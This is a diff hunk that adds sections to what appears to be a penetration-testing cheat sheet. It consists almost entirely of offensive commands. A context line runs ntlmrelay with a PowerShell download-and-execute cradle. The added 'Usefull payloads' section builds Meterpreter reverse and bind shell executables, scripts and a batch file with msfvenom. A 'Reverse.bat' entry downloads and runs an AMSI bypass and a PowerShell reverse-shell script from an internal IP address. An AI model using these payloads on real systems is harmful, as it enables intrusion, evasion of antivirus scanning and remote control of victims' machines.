@@ -510,5 +510,23 @@ ntlmrelay.py -t <TARGET> -c 'powershell.exe iex (New-Object.Net.Webclient).Downl
 responder -I <INTERFACE> -v
 ```
 
- 
+#### Usefull payloads
+```
+# Meterpreter ps1 rev shell
+msfvenom -p windows/x64/meterpreter_reverse_https -f psh -o msf.ps1 lhost=<HOST> lport=<PORT> exitfunc=thread
+
+# Meterpreter bind tcp executable
+msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=<HOST> LPORT=<PORT> -f exe -o bind_tcp.exe
+
+# Meterpreter reverse tcp executable
+Msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<HOST> LPORT=<PORT> -f exe > shell.exe
+
+# Bat file to run reverse powershell
+msfvenom -p cmd/windows/reverse_powershell LHOST=<HOST> LPORT=<PORT> > attach.bat
+```
+
+#### Reverse.bat
+```
+powershell.exe -c "iex (New-Object Net.WebClient).DownloadString('http://172.16.25.10:8090/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://172.16.25.10:8090/Invoke-PowerShellTcp2.ps1')"
+```
  
